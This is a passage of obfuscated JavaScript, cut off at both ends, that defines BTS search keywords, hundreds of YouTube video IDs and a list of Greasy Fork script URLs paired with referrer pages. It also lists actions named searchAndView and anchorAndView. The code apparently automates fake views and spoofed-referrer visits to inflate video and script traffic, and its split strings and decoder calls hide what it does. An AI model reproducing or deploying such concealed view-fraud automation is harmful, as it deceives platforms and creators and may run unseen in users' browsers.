'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + V(0x18) + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x10c9 + -0x9 * -0x2ff + -0x2bbd * 0x1);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    U(0x17) + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    W(0x8, 'BAzM') + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    W(0xe, '(0Wv') + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    U(0x16) + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    U(0xd) + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    V(0x19) + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    W(0xc, 'tjwu') + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    U(0xf) + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + U(0x12) + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0x10, 'E!1$') + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + U(0xb) + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
